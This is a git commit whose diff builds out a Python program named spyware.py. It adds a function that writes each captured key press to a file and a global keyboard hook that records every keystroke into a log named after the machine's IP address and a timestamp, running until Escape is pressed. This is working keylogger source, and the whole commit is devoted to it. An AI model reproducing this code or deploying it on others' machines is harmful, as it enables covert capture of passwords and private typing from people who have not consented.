66c0b5c6a9e740395547ae683679f6c9028b4896
Jiullian Ferreira <jiullian77470@gmail.com>
2023-11-01 18:34:44 +0100

    feat - write in document and improve function

--- functions.py
+++ functions.py
@@ -4,3 +4,31 @@ def creation_fichier(nom_fichier):
         open(nom_fichier, "w")
     except Exception as e:
         print(f"Erreur lors de la création de %s : {e}" %(nom_fichier))
+
+
+def touche_fichier(file_name, event):
+    try:
+        # Récupère la touche pressée
+        key = event.name
+
+        # Ouvre le fichier en mode ajout
+        with open(file_name, "a", encoding="utf-8") as f:
+            if key == "space":
+                f.write(" ")
+            elif key == "enter":
+                f.write("\n")
+            elif key == "backspace":
+                # Aller à la fin du fichier et reculer d'un caractère
+                f.seek(0, 2)
+                f.seek(f.tell() - 1, 0)
+                # Tronquer le fichier d'un caractère
+                f.truncate()
+            elif key == "maj" or key == "caps lock" or key == "shift" or key == "alt gr":
+                pass
+            else:
+                f.write(key)
+                print(key)
+
+    except AttributeError:
+        # Ignore les touches non valides (comme les touches de fonction)
+        pass
--- spyware.py
+++ spyware.py
@@ -4,7 +4,18 @@ from time import strftime
 
 ip_host = socket.gethostbyname(socket.gethostname())
 time = strftime("%Y-%m-%d_%H-%M-%S")
-name_file = ip_host + "_" + time + ".txt"
+file_name = ip_host + "_" + time + ".txt"
 
-functions.creation_fichier(name_file)
+functions.creation_fichier(file_name)
 
+# Active le mode d'enregistrement des touches
+keyboard.on_press(lambda event: functions.touche_fichier(file_name, event))
+
+try:
+    # Maintient le programme en cours d'exécution
+    keyboard.wait("esc")
+except KeyboardInterrupt:
+    pass
+
+# Désactive le mode d'enregistrement global des touches
+keyboard.unhook_all()
